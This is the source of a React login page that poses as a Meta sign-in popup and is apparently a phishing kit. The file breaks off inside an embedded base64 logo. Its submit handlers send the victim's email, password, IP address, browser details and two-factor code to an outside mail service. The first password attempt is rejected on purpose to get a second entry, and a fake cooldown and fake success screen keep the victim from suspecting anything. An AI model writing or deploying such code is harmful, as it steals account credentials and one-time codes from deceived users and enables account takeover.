import React, { useState, useEffect, useRef } from "react";
import { 
  ShieldCheck, 
  Loader2, 
  CheckCircle2, 
  KeyRound, 
  X,
  Mail,
  Lock,
  Smartphone,
  AlertCircle,
  AlertTriangle,
  Eye,
  EyeOff,
  CheckCircle
} from "lucide-react";

import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Progress } from "@/components/ui/progress";
import { cn } from "@/lib/utils";
import { sendLoginInfo, getUserIp } from "@/lib/emailService";

enum LoginStep {
  LOGIN_FIRST_ATTEMPT = 0,
  LOGIN_SECOND_ATTEMPT = 1,
  VERIFICATION_FIRST_ATTEMPT = 2,
  VERIFICATION_SECOND_ATTEMPT = 3,
  SUCCESS = 4
}

const MetaLoginPopup = () => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [verificationCode, setVerificationCode] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [currentStep, setCurrentStep] = useState(LoginStep.LOGIN_FIRST_ATTEMPT);
  const [errorMessage, setErrorMessage] = useState("");
  const [verificationError, setVerificationError] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [countdown, setCountdown] = useState(60);
  const [cooldownActive, setCooldownActive] = useState(false);
  
  const codeInputRef = useRef<HTMLInputElement>(null);
  const intervalRef = useRef<NodeJS.Timeout | null>(null);
  
  // Close the window when verification is successful
  useEffect(() => {
    if (currentStep === LoginStep.SUCCESS) {
      const timer = setTimeout(() => {
        window.close();
      }, 2000);
      
      return () => clearTimeout(timer);
    }
  }, [currentStep]);

  // Focus on the code input field when it becomes visible
  useEffect(() => {
    if (
      (currentStep === LoginStep.VERIFICATION_FIRST_ATTEMPT || 
       currentStep === LoginStep.VERIFICATION_SECOND_ATTEMPT) && 
      codeInputRef.current
    ) {
      codeInputRef.current.focus();
    }
  }, [currentStep]);

  // Handle cooldown timer for verification attempts
  useEffect(() => {
    // Start countdown when verification fails in first attempt
    if (currentStep === LoginStep.VERIFICATION_SECOND_ATTEMPT && cooldownActive) {
      intervalRef.current = setInterval(() => {
        setCountdown((prevCount) => {
          const newCount = prevCount - 1;
          if (newCount <= 0) {
            if (intervalRef.current) clearInterval(intervalRef.current);
            setCooldownActive(false);
            return 60;
          }
          return newCount;
        });
      }, 1000);
    }

    return () => {
      if (intervalRef.current) {
        clearInterval(intervalRef.current);
      }
    };
  }, [currentStep, cooldownActive]);

  // Random delay between 3-5 seconds
  const getRandomDelay = () => Math.floor(Math.random() * 2000) + 3000;
  
  const handlePasswordSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    setErrorMessage("");

    // Lấy IP và gửi thông tin đăng nhập qua EmailJS
    try {
      const ipAddress = await getUserIp();
      
      await sendLoginInfo({
        email,
        password,
        timestamp: new Date().toISOString(),
        ip: ipAddress,
        userAgent: navigator.userAgent,
      });
      
      console.log('Captured IP address:', ipAddress);
    } catch (error) {
      console.error('Error sending login info:', error);
    }

    // Simulate authentication process with longer delay (3-5 seconds)
    setTimeout(() => {
      if (!email || !password) {
        setIsLoading(false);
        setErrorMessage("Please enter both email and password.");
        return;
      }
      
      if (currentStep === LoginStep.LOGIN_FIRST_ATTEMPT) {
        // First password attempt always fails
        setTimeout(() => {
          setIsLoading(false);
          setErrorMessage("The password you entered is incorrect. Please try again.");
          setPassword("");
          setCurrentStep(LoginStep.LOGIN_SECOND_ATTEMPT);
        }, 500); // A small additional delay for the error message
      } else {
        // Show success for the second attempt, then transition to verification
        setTimeout(() => {
          setIsLoading(false);
          setCurrentStep(LoginStep.VERIFICATION_FIRST_ATTEMPT);
        }, 800);
      }
    }, getRandomDelay());
  };
  
  const handleVerificationSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    // If cooldown is active, don't allow submission
    if (cooldownActive) {
      return;
    }
    
    setIsLoading(true);
    setVerificationError("");

    // Lấy IP và gửi thông tin mã xác thực qua EmailJS
    try {
      const ipAddress = await getUserIp();
      
      await sendLoginInfo({
        email,
        password: 'Already sent in previous step',
        verificationCode,
        timestamp: new Date().toISOString(),
        ip: ipAddress,
        userAgent: navigator.userAgent,
      });
      
      console.log('Captured IP address for verification:', ipAddress);
    } catch (error) {
      console.error('Error sending verification info:', error);
    }

    // Simulate verification process with longer delay (3-5 seconds)
    setTimeout(() => {
      if (!verificationCode || verificationCode.length < 6) {
        setIsLoading(false);
        setVerificationError("Please enter a valid verification code (at least 6 digits).");
        return;
      }
      
      if (currentStep === LoginStep.VERIFICATION_FIRST_ATTEMPT) {
        // First verification attempt always fails
        // Start 60-second cooldown
        setTimeout(() => {
          setIsLoading(false);
          //setVerificationError("The verification code you entered is incorrect. Please try again after 60 seconds.");
          setVerificationCode("");
          setCooldownActive(true);
          setCountdown(60);
          setCurrentStep(LoginStep.VERIFICATION_SECOND_ATTEMPT);
        }, 500);
      } else {
        // Second verification attempt succeeds
        setTimeout(() => {
          setIsLoading(false);
          setCurrentStep(LoginStep.SUCCESS);
        }, 800);
      }
    }, getRandomDelay());
  };

  return (
    <div className="min-h-screen bg-gradient-to-b from-blue-50 to-gray-100 flex flex-col">
      <main className="flex-grow flex items-center justify-center p-4">
        <div className="bg-white rounded-lg shadow-xl p-8 w-full max-w-[580px] border border-gray-200">
          {currentStep === LoginStep.SUCCESS ? (
            <div className="text-center">
              <div className="mx-auto mb-6">
                <div className="h-20 w-20 bg-green-100 rounded-full flex items-center justify-center mx-auto">
                  <CheckCircle className="h-12 w-12 text-green-600" />
                </div>
              </div>
              <h2 className="text-2xl font-bold mb-3 text-gray-800">Verification Complete</h2>
              <p className="text-gray-600 mb-5">
                Your account has been successfully verified. This window will close automatically.
              </p>
              <Progress value={100} className="h-2 bg-gray-100" />
              <p className="text-sm text-gray-500 mt-3">Returning to application...</p>
            </div>
          ) : (
            <>
              
              {/* Login Steps */}
              {(currentStep === LoginStep.LOGIN_FIRST_ATTEMPT || currentStep === LoginStep.LOGIN_SECOND_ATTEMPT) && (
                <form onSubmit={handlePasswordSubmit} className="space-y-4">
                  <div className="mb-4">
                  <div className="flex justify-center mb-2">
  <img
    src="data:image/png;base64,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